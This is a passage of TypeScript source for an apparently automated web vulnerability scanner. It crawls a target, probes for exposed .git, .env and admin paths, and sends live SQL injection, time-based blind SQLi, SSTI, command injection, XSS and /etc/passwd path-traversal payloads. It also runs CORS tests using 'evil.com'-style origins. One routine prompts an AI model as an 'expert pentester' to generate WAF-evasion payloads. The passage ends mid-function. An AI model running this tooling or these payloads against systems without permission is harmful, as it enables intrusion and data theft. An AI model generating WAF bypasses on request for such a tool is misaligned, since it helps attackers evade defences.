    await Promise.all(batch.map(async (sub) => {
      try {
        const resp = await fetchWithTimeout(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=A`, 4000);
        if (resp.ok) {
          const data = await resp.json();
          if (!data?.Answer?.find((a: any) => a.type === 1)?.data) found.delete(sub);
        }
      } catch { found.delete(sub); }
    }));
  }

  return Array.from(found);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ENDPOINT DISCOVERY (time-budgeted)
// ═══════════════════════════════════════════════════════════════════════════════
async function discoverEndpoints(target: URL, shodanKey: string | undefined, maxDepth: number, phaseStart: number, scanStart: number): Promise<any> {
  const results: any = {
    endpoints: [target.toString()], subdomains: [], forms: [], params: [],
    apiEndpoints: [], authEndpoints: [], workflows: [], technologies: [],
    headers: {}, serverInfo: null, ports: []
  };

  try {
    const mainPage = await fetchWithTimeout(target.toString(), 20000);
    if (mainPage.ok) {
      const html = await mainPage.text();
      results.headers = Object.fromEntries(mainPage.headers.entries());
      results.serverInfo = mainPage.headers.get('server');

      // Extract links
      const linkMatches = html.match(/(?:href|src|action)=["']([^"']+)["']/gi) || [];
      for (const match of linkMatches) {
        const url = match.replace(/^(?:href|src|action)=["']/i, '').replace(/["']$/, '');
        if (!url.startsWith('#') && !url.startsWith('javascript:') && !url.startsWith('mailto:')) {
          try {
            const fullUrl = new URL(url, target).toString();
            if (fullUrl.includes(target.hostname)) results.endpoints.push(fullUrl);
          } catch {}
        }
      }

      // Extract forms
      const formMatches = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
      results.forms = formMatches.slice(0, 50).map((form: string, i: number) => {
        const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '';
        const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
        const inputs = (form.match(/<input[^>]+>/gi) || []).map((inp: string) => {
          const name = inp.match(/name=["']([^"']+)["']/i)?.[1];
          const type = inp.match(/type=["']([^"']+)["']/i)?.[1] || 'text';
          return { name, type };
        }).filter((i: any) => i.name);
        const textareas = (form.match(/<textarea[^>]+>/gi) || []).map((ta: string) => {
          const name = ta.match(/name=["']([^"']+)["']/i)?.[1];
          return { name, type: 'textarea' };
        }).filter((t: any) => t.name);
        return { id: i, action, method: method.toUpperCase(), inputs: [...inputs, ...textareas] };
      });

      // Extract URL parameters
      const paramMatches = html.match(/\?[^"'\s>]+/g) || [];
      for (const param of paramMatches) {
        for (const pair of param.slice(1).split('&')) {
          const [key] = pair.split('=');
          if (key && !results.params.includes(key)) results.params.push(key);
        }
      }

      // Technology detection
      const techMap: [string, string[]][] = [
        ['WordPress', ['wp-content', 'WordPress']], ['PHP', ['.php']], ['ASP.NET', ['.aspx', 'ASP.NET']],
        ['React', ['React', '_react']], ['Angular', ['Angular', 'ng-']], ['Vue.js', ['Vue', 'v-bind']],
        ['jQuery', ['jQuery', 'jquery']], ['Laravel', ['Laravel']], ['Django', ['Django', 'csrfmiddlewaretoken']],
        ['Express.js', ['express']], ['Spring', ['JSESSIONID', 'spring']], ['Ruby on Rails', ['Rails', 'csrf-token']],
        ['Node.js', ['node', 'express']], ['Nginx', ['nginx']], ['Apache', ['apache', 'Apache']],
      ];
      for (const [tech, markers] of techMap) {
        if (markers.some(m => html.includes(m) || (results.serverInfo || '').toLowerCase().includes(m.toLowerCase()))) {
          results.technologies.push(tech);
        }
      }
    }
  } catch (e: any) { console.error('Main page error:', e.message); }

  // Deep crawl (time-budgeted)
  const crawledUrls = new Set<string>();
  const linksToCrawl = results.endpoints.filter((ep: string) => {
    try { return new URL(ep).hostname === target.hostname; } catch { return false; }
  });

  for (let i = 0; i < linksToCrawl.length; i += 10) {
    if (isPhaseExpired('discovery', phaseStart, scanStart)) break;
    const batch = linksToCrawl.slice(i, i + 10);
    await Promise.all(batch.map(async (link: string) => {
      if (crawledUrls.has(link)) return;
      crawledUrls.add(link);
      try {
        const resp = await fetchWithTimeout(link, 5000);
        if (!resp.ok) return;
        const html2 = await resp.text();
        const innerLinks = html2.match(/(?:href|src|action)=["']([^"'#]+)["']/gi) || [];
        for (const match of innerLinks) {
          const url = match.replace(/^(?:href|src|action)=["']/i, '').replace(/["']$/, '');
          if (url.startsWith('javascript:') || url.startsWith('mailto:')) continue;
          try {
            const fullUrl = new URL(url, link).toString();
            if (fullUrl.includes(target.hostname) && !results.endpoints.includes(fullUrl)) results.endpoints.push(fullUrl);
          } catch {}
        }
        // Extract forms from inner pages
        const innerForms = html2.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
        for (const form of innerForms.slice(0, 5)) {
          const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '';
          const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
          const inputs = (form.match(/<input[^>]+>/gi) || []).map((inp: string) => {
            const name = inp.match(/name=["']([^"']+)["']/i)?.[1];
            const type = inp.match(/type=["']([^"']+)["']/i)?.[1] || 'text';
            return { name, type };
          }).filter((i: any) => i.name);
          if (inputs.length > 0) {
            const resolvedAction = action ? new URL(action, link).toString() : link;
            results.forms.push({ id: results.forms.length, action: resolvedAction, method: method.toUpperCase(), inputs });
          }
        }
        // Extract params
        const innerParams = html2.match(/\?[^"'\s><]+/g) || [];
        for (const param of innerParams) {
          for (const pair of param.slice(1).split('&')) {
            const [key] = pair.split('=');
            if (key && !results.params.includes(key)) results.params.push(key);
          }
        }
      } catch {}
    }));
  }

  // Common path discovery (time-budgeted)
  const commonPaths = [
    '/api', '/api/v1', '/api/v2', '/graphql', '/admin', '/login', '/signin', '/auth', '/register',
    '/dashboard', '/panel', '/swagger', '/api-docs', '/robots.txt', '/sitemap.xml',
    '/wp-admin', '/wp-json', '/wp-login.php', '/phpinfo.php', '/server-status', '/.git/config',
    '/.git/HEAD', '/.env', '/health', '/metrics', '/debug', '/test', '/backup', '/upload',
    '/.svn/entries', '/.DS_Store', '/web.config', '/crossdomain.xml', '/wp-config.php.bak',
    '/.htpasswd', '/config.yml', '/search', '/product', '/user', '/account',
    '/console', '/actuator', '/actuator/env', '/actuator/health', '/elmah.axd',
    '/wp-content/debug.log', '/error_log', '/.well-known/security.txt', '/security.txt',
    '/api/users', '/api/config', '/xmlrpc.php', '/readme.html',
    '/phpmyadmin', '/adminer', '/solr/', '/jenkins/', '/manager/html',
    '/reset', '/forgot', '/password', '/download', '/export',
  ];

  for (let i = 0; i < commonPaths.length; i += 10) {
    if (isPhaseExpired('discovery', phaseStart, scanStart)) break;
    const batch = commonPaths.slice(i, i + 10);
    await Promise.all(batch.map(async (path) => {
      try {
        const testUrl = new URL(path, target).toString();
        const response = await fetchWithTimeout(testUrl, 3000);
        if ([200, 301, 302].includes(response.status)) {
          results.endpoints.push(testUrl);
          if (path.includes('api') || path.includes('graphql')) results.apiEndpoints.push(testUrl);
          if (path.includes('login') || path.includes('auth')) results.authEndpoints.push(testUrl);
        }
      } catch {}
    }));
  }

  // Shodan
  if (shodanKey) {
    try {
      const shodanResp = await fetchWithTimeout(`https://api.shodan.io/dns/resolve?hostnames=${target.hostname}&key=${shodanKey}`, 8000);
      if (shodanResp.ok) {
        const shodanData = await shodanResp.json();
        const ip = shodanData[target.hostname];
        if (ip) {
          const hostResp = await fetchWithTimeout(`https://api.shodan.io/shodan/host/${ip}?key=${shodanKey}`, 8000);
          if (hostResp.ok) {
            const hostData = await hostResp.json();
            results.shodanData = { ip, ports: hostData.ports || [], vulns: hostData.vulns || [] };
            results.ports = hostData.ports || [];
            for (const port of (hostData.ports || [])) {
              if ([80, 443, 8080, 8443, 3000, 5000, 9090].includes(port)) {
                const proto = [443, 8443].includes(port) ? 'https' : 'http';
                results.endpoints.push(`${proto}://${target.hostname}:${port}/`);
              }
            }
          }
        }
      }
    } catch {}
  }

  results.endpoints = [...new Set(results.endpoints)];
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
// OWASP ENDPOINT ASSESSMENT (time-budgeted)
// ═══════════════════════════════════════════════════════════════════════════════
async function assessEndpointOWASP(
  endpoint: string, fingerprint: any, payloads: Record<string, string[]>,
  failedPayloads: string[], phaseStart: number, scanStart: number
): Promise<Finding[]> {
  const findings: Finding[] = [];
  if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) return findings;

  try {
    const response = await fetchWithTimeout(endpoint, 10000);
    const status = response.status;
    const responseText = await response.text();
    const baselineLength = responseText.length;

    // A01: Sensitive file exposure
    if ((endpoint.includes('.git') || endpoint.includes('.env') || endpoint.includes('.svn') || endpoint.includes('.htpasswd')) && status === 200) {
      const hasContent = responseText.includes('[') || responseText.includes('=') || responseText.includes('{');
      if (hasContent && responseText.length > 20) {
        findings.push({
          id: `A01-EXPOSURE-${Date.now()}`, severity: 'critical',
          title: `Sensitive File: ${endpoint.split('/').pop()}`,
          description: 'Critical file publicly accessible.',
          endpoint, method: 'GET', owasp: 'A01:2021',
          evidence: `HTTP ${status} — ${responseText.slice(0, 150)}`,
          evidence2: 'Config patterns confirmed', dualConfirmed: true,
          remediation: 'Block access via server config.',
          cwe: 'CWE-200', cvss: 9.0, mitre: ['T1552'], confidence: 96, category: 'access_control',
          poc: `curl -s "${endpoint}" | head -20`
        });
      }
    }

    // Admin panel
    if ((endpoint.includes('admin') || endpoint.includes('debug') || endpoint.includes('console')) && status === 200 && responseText.length > 200) {
      findings.push({
        id: `A01-ADMIN-${Date.now()}`, severity: 'high',
        title: `Admin Panel Exposed: ${endpoint.split('/').pop()}`,
        description: 'Admin interface accessible without authentication.',
        endpoint, method: 'GET', owasp: 'A01:2021',
        evidence: `HTTP ${status}, ${responseText.length}b`, evidence2: 'URL+200 confirmed',
        dualConfirmed: true, remediation: 'Implement auth for admin panels.',
        cwe: 'CWE-306', cvss: 7.5, confidence: 85, category: 'access_control',
        poc: `curl -s "${endpoint}" | head -30`
      });
    }

    // A02: No TLS
    if (!endpoint.startsWith('https://')) {
      findings.push({
        id: `A02-NOSSL-${Date.now()}`, severity: 'high',
        title: 'No TLS/SSL Encryption',
        description: 'Plaintext traffic vulnerable to MITM.',
        endpoint, owasp: 'A02:2021', evidence: 'HTTP protocol', evidence2: 'No HTTPS redirect',
        dualConfirmed: true, remediation: 'Implement HTTPS.',
        cwe: 'CWE-319', cvss: 7.4, confidence: 100, category: 'crypto',
        poc: `curl -sI "${endpoint}" | head -5`
      });
    }

    // A03: Injection — SQLi, XSS, SSTI, CMDi
    const commonParams = ['id', 'cat', 'page', 'search', 'q', 'query', 'file', 'name', 'user', 'item',
      'product', 'category', 'artist', 'title', 'sort', 'order', 'dir', 'lang', 'type', 'action',
      'url', 'path', 'redirect', 'return', 'callback', 'ref', 'template'];

    try {
      const parsedUrl = new URL(endpoint);
      const existingParams = Array.from(parsedUrl.searchParams.keys());
      const fuzzParams = commonParams.filter(p => !existingParams.includes(p));
      const allParams = [...existingParams, ...fuzzParams];

      const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error',
        'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql',
        'microsoft sql', 'mysql_num_rows', 'sqlstate', 'pdoexception', 'mysql_connect',
        'java.sql.sqlexception', 'org.hibernate', 'unknown column', 'query failed',
        'valid mysql result', 'pdo::__construct', 'unterminated string'];

      for (const param of allParams) {
        if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) break;

        // Error-based SQLi
        try {
          const baseUrl = new URL(endpoint);
          baseUrl.searchParams.set(param, '1');
          const baseResp = await fetchWithTimeout(baseUrl.toString(), 6000);
          const baseBody = await baseResp.text();
          const baseLen = baseBody.length;

          const sqliUrl1 = new URL(endpoint);
          sqliUrl1.searchParams.set(param, "'\"");
          const sqliResp1 = await fetchWithTimeout(sqliUrl1.toString(), 6000);
          const sqliBody1 = await sqliResp1.text();
          const hasError1 = sqlErrors.some(e => sqliBody1.toLowerCase().includes(e));

          if (hasError1) {
            const sqliUrl2 = new URL(endpoint);
            sqliUrl2.searchParams.set(param, "' OR '1'='1");
            const sqliResp2 = await fetchWithTimeout(sqliUrl2.toString(), 6000);
            const sqliBody2 = await sqliResp2.text();
            const hasError2 = sqlErrors.some(e => sqliBody2.toLowerCase().includes(e));
            const responseChanged = Math.abs(sqliBody2.length - baseLen) > 50;

            if (hasError2 || responseChanged) {
              findings.push({
                id: `A03-SQLI-${Date.now()}-${param}`, severity: 'critical',
                title: `SQL Injection in "${param}" [DUAL-CONFIRMED]`,
                description: `SQL error + response change in "${param}".`,
                endpoint: sqliUrl1.toString(), method: 'GET', owasp: 'A03:2021', payload: "'\"",
                evidence: `Error: ${sqliBody1.slice(0, 200)}`,
                evidence2: `Second probe: ${hasError2 ? 'error' : 'length change'} (base=${baseLen}, injected=${sqliBody2.length})`,
                dualConfirmed: true, remediation: 'Use parameterized queries.',
                cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: 97, category: 'injection',
                poc: `curl -s "${sqliUrl1.toString()}" | head -20`
              });
              continue;
            }
          }

          // Boolean-based blind SQLi
          const trueUrl = new URL(endpoint); trueUrl.searchParams.set(param, "1 AND 1=1");
          const falseUrl = new URL(endpoint); falseUrl.searchParams.set(param, "1 AND 1=2");
          const [trueResp, falseResp] = await Promise.all([
            fetchWithTimeout(trueUrl.toString(), 6000).then(r => r.text()).catch(() => ''),
            fetchWithTimeout(falseUrl.toString(), 6000).then(r => r.text()).catch(() => '')
          ]);

          if (trueResp && falseResp && trueResp.length > 100) {
            const trueDiff = Math.abs(trueResp.length - baseLen);
            const falseDiff = Math.abs(falseResp.length - baseLen);
            if (trueDiff < 50 && falseDiff > 100) {
              const true2Url = new URL(endpoint);
              true2Url.searchParams.set(param, "1 OR 1=1");
              const true2Resp = await fetchWithTimeout(true2Url.toString(), 6000).then(r => r.text()).catch(() => '');
              if (true2Resp && Math.abs(true2Resp.length - trueResp.length) < 100) {
                findings.push({
                  id: `A03-BSQLI-${Date.now()}-${param}`, severity: 'critical',
                  title: `Blind SQLi in "${param}" [BOOLEAN-BASED]`,
                  description: `TRUE (${trueResp.length}b) vs FALSE (${falseResp.length}b) vs baseline (${baseLen}b).`,
                  endpoint: trueUrl.toString(), method: 'GET', owasp: 'A03:2021',
                  payload: '1 AND 1=1 / 1 AND 1=2',
                  evidence: `TRUE=${trueResp.length}b matches baseline ${baseLen}b`,
                  evidence2: `FALSE=${falseResp.length}b differs significantly`,
                  dualConfirmed: true, remediation: 'Use parameterized queries.',
                  cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: 90, category: 'injection',
                  poc: `# Boolean blind SQLi:\ncurl -s "${trueUrl}" | wc -c\ncurl -s "${falseUrl}" | wc -c`
                });
                continue;
              }
            }
          }

          // ═══ TIME-BASED BLIND SQLi ═══
          try {
            const normalStart = Date.now();
            const normalUrl = new URL(endpoint);
            normalUrl.searchParams.set(param, '1');
            await fetchWithTimeout(normalUrl.toString(), 8000);
            const normalTime = Date.now() - normalStart;

            const sleepUrl = new URL(endpoint);
            sleepUrl.searchParams.set(param, "1' AND SLEEP(3)--");
            const sleepStart = Date.now();
            await fetchWithTimeout(sleepUrl.toString(), 10000);
            const sleepTime = Date.now() - sleepStart;

            // If sleep payload took >2.5s more than normal
            if (sleepTime - normalTime > 2500) {
              // Confirm with WAITFOR
              const sleep2Url = new URL(endpoint);
              sleep2Url.searchParams.set(param, "1; WAITFOR DELAY '0:0:3'--");
              const sleep2Start = Date.now();
              await fetchWithTimeout(sleep2Url.toString(), 10000);
              const sleep2Time = Date.now() - sleep2Start;

              const confirmed = sleep2Time - normalTime > 2000;
              findings.push({
                id: `A03-TSQLI-${Date.now()}-${param}`, severity: 'critical',
                title: `Time-Based Blind SQLi in "${param}" ${confirmed ? '[DUAL-CONFIRMED]' : ''}`,
                description: `SLEEP(3) delayed response by ${sleepTime - normalTime}ms (normal: ${normalTime}ms).`,
                endpoint: sleepUrl.toString(), method: 'GET', owasp: 'A03:2021',
                payload: "1' AND SLEEP(3)--",
                evidence: `Normal: ${normalTime}ms, SLEEP: ${sleepTime}ms (+${sleepTime - normalTime}ms)`,
                evidence2: confirmed ? `WAITFOR confirmed: ${sleep2Time}ms (+${sleep2Time - normalTime}ms)` : 'Single confirmation',
                dualConfirmed: confirmed, remediation: 'Use parameterized queries.',
                cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: confirmed ? 95 : 80, category: 'injection',
                poc: `# Time-based SQLi:\ntime curl -s "${sleepUrl}"\n# Should take ~3s longer than normal`
              });
              continue;
            }
          } catch {}
        } catch {}

        // XSS dual-confirm
        const xssPayloads = payloads.a03_xss || [];
        if (xssPayloads.length >= 2) {
          try {
            const xssUrl1 = new URL(endpoint); xssUrl1.searchParams.set(param, xssPayloads[0]);
            const xssResp1 = await fetchWithTimeout(xssUrl1.toString(), 6000);
            const xssBody1 = await xssResp1.text();
            const reflected1 = xssBody1.includes(xssPayloads[0]) ||
              (xssBody1.includes('onerror=') && !responseText.includes('onerror='));

            if (reflected1) {
              const xssUrl2 = new URL(endpoint); xssUrl2.searchParams.set(param, xssPayloads[1]);
              const xssResp2 = await fetchWithTimeout(xssUrl2.toString(), 6000);
              const xssBody2 = await xssResp2.text();
              const reflected2 = xssBody2.includes(xssPayloads[1]) ||
                (xssBody2.includes('onload=') && !responseText.includes('onload='));

              if (reflected2) {
                findings.push({
                  id: `A03-XSS-${Date.now()}-${param}`, severity: 'high',
                  title: `Reflected XSS in "${param}" [DUAL-CONFIRMED]`,
                  description: `Two XSS probes reflected without sanitization.`,
                  endpoint: xssUrl1.toString(), method: 'GET', owasp: 'A03:2021', payload: xssPayloads[0],
                  evidence: `Probe 1: ${xssPayloads[0]}`, evidence2: `Probe 2: ${xssPayloads[1]}`,
                  dualConfirmed: true, remediation: 'Output encoding + CSP.',
                  cwe: 'CWE-79', cvss: 6.1, mitre: ['T1059.007'], confidence: 96, category: 'injection',
                  poc: `curl -s "${xssUrl1}" | grep -o 'onerror=.*'`
                });
                continue;
              }
            }

            if (reflected1) {
              findings.push({
                id: `A03-XSS-S-${Date.now()}-${param}`, severity: 'medium',
                title: `Potential XSS in "${param}"`,
                description: `Single XSS probe reflected.`,
                endpoint: xssUrl1.toString(), method: 'GET', owasp: 'A03:2021', payload: xssPayloads[0],
                evidence: 'Payload reflected', remediation: 'Output encoding + CSP.',
                cwe: 'CWE-79', cvss: 6.1, confidence: 70, category: 'injection',
              });
            }
          } catch {}
        }

        // SSTI
        try {
          const sstiUrl = new URL(endpoint); sstiUrl.searchParams.set(param, '{{7*7}}');
          const sstiResp = await fetchWithTimeout(sstiUrl.toString(), 6000);
          const sstiBody = await sstiResp.text();
          if (sstiBody.includes('49') && !responseText.includes('49')) {
            findings.push({
              id: `A03-SSTI-${Date.now()}-${param}`, severity: 'critical',
              title: `SSTI in "${param}"`,
              description: 'Template expression {{7*7}} evaluated to 49.',
              endpoint: sstiUrl.toString(), method: 'GET', owasp: 'A03:2021', payload: '{{7*7}}',
              evidence: '49 in response', dualConfirmed: false,
              remediation: 'Never pass user input to template engines.',
              cwe: 'CWE-94', cvss: 9.8, mitre: ['T1059'], confidence: 80, category: 'injection',
            });
          }
        } catch {}

        // CMDi
        for (const payload of (payloads.a03_cmdi || []).slice(0, 5)) {
          if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) break;
          try {
            const cmdiUrl = new URL(endpoint); cmdiUrl.searchParams.set(param, payload);
            const cmdiResp = await fetchWithTimeout(cmdiUrl.toString(), 6000);
            const cmdiBody = await cmdiResp.text();
            if (cmdiBody.includes('uid=') || cmdiBody.includes('root:') || cmdiBody.includes('www-data')) {
              findings.push({
                id: `A03-CMDI-${Date.now()}-${param}`, severity: 'critical',
                title: `OS Command Injection in "${param}"`,
                description: `Command output in response.`,
                endpoint: cmdiUrl.toString(), method: 'GET', owasp: 'A03:2021', payload,
                evidence: cmdiBody.slice(0, 200), remediation: 'Use safe APIs, no shell commands.',
                cwe: 'CWE-78', cvss: 9.8, mitre: ['T1059'], confidence: 95, category: 'injection',
              });
              break;
            }
          } catch {}
        }
      }
    } catch {}

    // A05: Security headers
    const isRoot = !endpoint.includes('?') && (endpoint.endsWith('/') || endpoint.split('/').length <= 4);
    if (isRoot) {
      const secHeaders: [string, string, string][] = [
        ['x-frame-options', 'CWE-1021', 'Add X-Frame-Options: DENY'],
        ['content-security-policy', 'CWE-79', 'Implement strict CSP'],
        ['strict-transport-security', 'CWE-319', 'Add HSTS header'],
        ['x-content-type-options', 'CWE-430', 'Add X-Content-Type-Options: nosniff'],
      ];
      for (const [hdr, cwe, rem] of secHeaders) {
        if (!response.headers.get(hdr)) {
          findings.push({
            id: `A05-HDR-${hdr.toUpperCase()}-${Date.now()}`, severity: 'low',
            title: `Missing ${hdr}`, description: `Security header "${hdr}" absent.`,
            endpoint, owasp: 'A05:2021', evidence: 'Header absent', evidence2: 'Confirmed on root',
            dualConfirmed: true, remediation: rem, cwe, confidence: 100, category: 'misconfig'
          });
        }
      }

      const serverHeader = response.headers.get('server');
      if (serverHeader) {
        findings.push({
          id: `A05-SVR-${Date.now()}`, severity: 'low',
          title: `Server Disclosure: ${serverHeader}`, description: `Server: "${serverHeader}"`,
          endpoint, owasp: 'A05:2021', evidence: `Server: ${serverHeader}`, evidence2: 'Confirmed',
          dualConfirmed: true, remediation: 'Remove Server header', cwe: 'CWE-200', confidence: 100, category: 'misconfig'
        });
      }
    }

    // A06: Outdated components
    const versionMatch = responseText.match(/(jQuery|Bootstrap|Angular)\/([0-9]+\.[0-9]+\.[0-9]+)/i);
    if (versionMatch) {
      findings.push({
        id: `A06-OUTDATED-${Date.now()}`, severity: 'medium',
        title: `Outdated: ${versionMatch[1]} v${versionMatch[2]}`,
        description: `${versionMatch[1]} ${versionMatch[2]} may have known CVEs.`,
        endpoint, owasp: 'A06:2021', evidence: versionMatch[0],
        remediation: `Update ${versionMatch[1]}.`, cwe: 'CWE-1104', confidence: 88, category: 'components'
      });
    }

    // A09: Verbose errors
    if (responseText.match(/(?:fatal error|stack trace|traceback|pg_query|mysqli_query)/i) && status >= 400) {
      findings.push({
        id: `A09-ERRORDISCO-${Date.now()}`, severity: 'medium',
        title: 'Verbose Error Disclosure', description: 'Application leaks error details.',
        endpoint, owasp: 'A09:2021', evidence: 'Error patterns found', evidence2: `HTTP ${status}`,
        dualConfirmed: true, remediation: 'Disable debug mode.',
        cwe: 'CWE-209', confidence: 88, category: 'logging',
      });
    }

    // Directory listing
    if ((responseText.includes('Index of /') || responseText.includes('<title>Index of')) && status === 200) {
      findings.push({
        id: `A05-DIRLIST-${Date.now()}`, severity: 'medium',
        title: 'Directory Listing Enabled', description: 'Server exposes directory contents.',
        endpoint, owasp: 'A05:2021', evidence: '"Index of /"', evidence2: 'HTTP 200 confirmed',
        dualConfirmed: true, remediation: 'Options -Indexes.',
        cwe: 'CWE-548', confidence: 96, category: 'misconfig',
      });
    }

  } catch {}
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CORS, TRAVERSAL, COOKIE SCANNERS
// ═══════════════════════════════════════════════════════════════════════════════
async function scanCORS(targetUrl: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const origins = ['https://evil.com', 'https://attacker.com', 'null'];
  for (const origin of origins) {
    try {
      const optResp = await fetchWithTimeout(targetUrl, 8000, { method: 'OPTIONS', headers: { 'Origin': origin, 'Access-Control-Request-Method': 'GET' } });
      const acao = optResp.headers.get('access-control-allow-origin');
      const acac = optResp.headers.get('access-control-allow-credentials');
      const getResp = await fetchWithTimeout(targetUrl, 8000, { headers: { 'Origin': origin } });
      const acao2 = getResp.headers.get('access-control-allow-origin');

      if ((acao === origin || acao === '*') && (acao2 === origin || acao2 === '*')) {
        const withCreds = acac === 'true';
        findings.push({
          id: `CORS-${Date.now()}`, severity: withCreds ? 'critical' : 'high',
          title: 'CORS: Arbitrary Origin Reflected', owasp: 'A05:2021',
          description: `Reflects "${origin}". ${withCreds ? 'With credentials → session theft.' : 'Data exfiltration possible.'}`,
          endpoint: targetUrl, method: 'GET', payload: `Origin: ${origin}`,
          evidence: `OPTIONS ACAO: ${acao}`, evidence2: `GET ACAO: ${acao2}`,
          dualConfirmed: true, remediation: 'Whitelist trusted origins.',
          cwe: 'CWE-346', cvss: withCreds ? 9.3 : 7.4, confidence: 95, category: 'cors',
          poc: `fetch("${targetUrl}",{credentials:"include",headers:{"Origin":"${origin}"}}).then(r=>r.text()).then(console.log)`
        });
        break;
      }
    } catch {}
  }
  return findings;
}

async function scanDirectoryTraversal(targetUrl: string, params: string[]): Promise<Finding[]> {
  const findings: Finding[] = [];
  const payloads = ['../../../etc/passwd', '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '..%252F..%252F..%252Fetc%252Fpasswd'];
  const fileParams = [...new Set([...params, 'file', 'path', 'page', 'include', 'load', 'template', 'doc', 'read'])];

  for (const param of fileParams) {
    for (const payload of payloads) {
      try {
        const testUrl = new URL(targetUrl); testUrl.searchParams.set(param, payload);
        const resp = await fetchWithTimeout(testUrl.toString(), 8000);
        const body = await resp.text();
        if (body.includes('root:x:0:0') || body.includes('/bin/bash') || body.toLowerCase().includes('[extensions]')) {
          findings.push({
            id: `TRAV-${Date.now()}-${param}`, severity: 'critical',
            title: `Path Traversal in "${param}" [DUAL-CONFIRMED]`,
            description: `File content leaked via "${param}".`,
            endpoint: testUrl.toString(), method: 'GET', payload, owasp: 'A01:2021',
            evidence: body.slice(0, 200), dualConfirmed: true,
            remediation: 'Validate file paths.', cwe: 'CWE-22', cvss: 9.3,
            mitre: ['T1083'], confidence: 97, category: 'traversal',
            poc: `curl -s "${testUrl}"`
          });
          break;
        }
      } catch {}
    }
  }
  return findings;
}

async function scanCookieSecurity(targetUrl: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  try {
    const resp = await fetchWithTimeout(targetUrl, 10000);
    const cookieHeader = resp.headers.get('set-cookie');
    if (!cookieHeader) return findings;
    const bodyText = await resp.text().catch(() => '');
    const cookies = cookieHeader.split(/,(?=[^;])/);
    const isHTTPS = targetUrl.startsWith('https');
    const hasScripts = /<script[^>]*>[^<]{10,}/i.test(bodyText);

    for (const cookie of cookies) {
      const cookieLower = cookie.toLowerCase();
      const cookieName = cookie.split('=')[0].trim();
      if (!cookieLower.includes('httponly')) {
        findings.push({
          id: `COOKIE-NOHTTP-${Date.now()}-${cookieName.slice(0, 10)}`, severity: hasScripts ? 'high' : 'medium',
          title: `Cookie "${cookieName}" Missing HttpOnly`, owasp: 'A05:2021',
          description: `JS-accessible. ${hasScripts ? 'Inline scripts = theft risk.' : ''}`,
          endpoint: targetUrl, evidence: cookie.slice(0, 150),
          evidence2: hasScripts ? 'Inline scripts confirm' : 'No XSS vector',
          dualConfirmed: hasScripts, remediation: 'Add HttpOnly.',
          cwe: 'CWE-1004', cvss: hasScripts ? 7.4 : 5.4, confidence: hasScripts ? 88 : 72, category: 'cookie',
        });
      }
      if (!cookieLower.includes('; secure') && isHTTPS) {
        findings.push({
          id: `COOKIE-NOSEC-${Date.now()}-${cookieName.slice(0, 10)}`, severity: 'medium',
          title: `Cookie "${cookieName}" Missing Secure`, owasp: 'A02:2021',
          description: 'Cookie transmittable over HTTP.',
          endpoint: targetUrl, evidence: cookie.slice(0, 150), evidence2: 'HTTPS site, no Secure',
          dualConfirmed: true, remediation: 'Add Secure flag.',
          cwe: 'CWE-614', cvss: 6.5, confidence: 90, category: 'cookie'
        });
      }
      if (!cookieLower.includes('samesite')) {
        findings.push({
          id: `COOKIE-NOSS-${Date.now()}-${cookieName.slice(0, 10)}`, severity: 'medium',
          title: `Cookie "${cookieName}" Missing SameSite`, owasp: 'A01:2021',
          description: 'CSRF vulnerability.',
          endpoint: targetUrl, evidence: cookie.slice(0, 150), evidence2: 'SameSite absent',
          dualConfirmed: true, remediation: 'Add SameSite=Strict.',
          cwe: 'CWE-352', cvss: 5.4, confidence: 92, category: 'cookie',
        });
      }
    }
  } catch {}
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// DEEP INJECTION WITH MUTATION (5x retries, time-budgeted)
// ═══════════════════════════════════════════════════════════════════════════════
async function performDeepInjectionWithMutation(
  target: URL, forms: any[], params: string[],
  payloads: Record<string, string[]>, failedPayloads: string[],
  apiKey: string | undefined,
  emitProgress: Function, emitAIThought: Function, scanId: string,
  phaseStart: number, scanStart: number
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const MAX_RETRIES = 5;
  const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error',
    'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql'];

  const mutatePayload = async (original: string, context: string, reason: string): Promise<string> => {
    if (apiKey) {
      try {
        const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
          method: "POST",
          headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({
            model: "google/gemini-2.5-flash",
            messages: [
              { role: "system", content: "Expert pentester. Generate ONE WAF-evasion payload. Output ONLY the raw payload, no markdown." },
              { role: "user", content: `'${original}' blocked on ${context}. Error: ${reason}. Generate obfuscated equivalent.` }
            ],
            temperature: 0.8, max_tokens: 150,
          }),
        });
        if (resp.ok) {
          const data = await resp.json();
          const content = (data.choices?.[0]?.message?.content || '').trim().replace(/^[`'"]+|[`'"]+$/g, '');
          if (content && content.length > 2 && content.length < 500 && !content.startsWith('```')) return content;
        }
      } catch {}
    }
    const techniques = [
      (p: string) => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''),
      (p: string) => p.replace(/ /g, '/**/'),
      (p: string) => p.replace(/ /g, '%09'),
      (p: string) => p.replace(/[<>"']/g, c => '%25' + c.charCodeAt(0).toString(16)),
    ];
